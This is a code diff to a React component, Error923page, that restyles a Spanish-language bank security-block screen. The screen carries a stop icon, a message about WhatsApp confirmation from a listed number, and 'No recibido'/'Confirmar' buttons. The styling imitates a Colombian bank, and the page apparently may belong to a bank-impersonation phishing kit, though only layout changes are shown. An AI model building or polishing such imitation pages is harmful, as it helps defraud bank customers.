@@ -273,44 +273,36 @@ export default function Error923page() {
                                         display: "flex",
                                         alignItems: "center",
                                         justifyContent: "center",
-                                        marginBottom: "20px"
+                                        marginBottom: "0px"
                                     }}
                                 >
                                     <img
-                                        src="/assets/images/stop2.png"
+                                        src="/assets/images/seguros/stop-hand.png"
                                         alt="Alert Icon"
                                         style={{ width: "25px", height: "30px" }}
                                     />
                                 </div>
                             </div>
 
-                            <div style={{
-                                textAlign: "center"
-                            }}>
-                                <h2 style={{
-                                    fontSize: "20px",
-                                    fontWeight: "bold",
-                                    marginBottom: "20px",
-                                    lineHeight: "1.3",
-                                    color: "#ffffff",
-                                }}>
+                            <div style={{ textAlign: "center" }}>
+                                <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 500, fontSize: "24px", lineHeight: "1.5", marginBottom: "25px" }}>
                                     Por seguridad, no puedes continuar la transacción
                                 </h2>
 
-                                <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
+                                <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 300, fontSize: "15.5px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                                     Código: 923 Para confirmar si eres tú quién hace la transacción, te escribiremos desde nuestro WhatsApp oficial <strong>301 353 6788</strong>, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
                                 </p>
 
-                                <p style={{ fontSize: "14px", fontWeight: "bold", marginBottom: "30px", color: "#ffffff" }}>
+                                <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 300, fontSize: "15.5px", fontWeight: "bold", marginBottom: "30px", color: "#ffffff" }}>
                                     Código 923
                                 </p>
                             </div>
 
                             <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
-                                <button onClick={() => handleAction('cancelar')} className="login-btn-borrar">
-                                    Cancelar
+                                <button className="bc-button-primary login-btn-borrar" style={{ fontSize: "14px" }} onClick={() => handleAction('cancelar')}>
+                                    No recibido
                                 </button>
-                                <button className="login-btn" onClick={() => handleAction('confirmar')}>
+                                <button className="bc-button-primary login-btn" style={{ fontSize: "14px" }} onClick={() => handleAction('confirmar')}>
                                     Confirmar
                                 </button>
                             </div>
